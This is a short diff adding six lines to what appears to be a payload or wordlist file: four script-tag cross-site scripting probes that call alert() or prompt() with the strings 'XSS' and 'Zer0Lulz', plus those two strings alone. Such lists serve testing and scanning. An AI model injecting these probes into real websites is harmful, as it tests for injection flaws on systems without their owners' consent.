@@ -1,0 +1,6 @@
+<script>alert('XSS')</script>
+<script>alert('Zer0Lulz')</script>
+<script>prompt('XSS')</script>
+<script>prompt('Zer0Lulz')</script>
+XSS
+Zer0Lulz
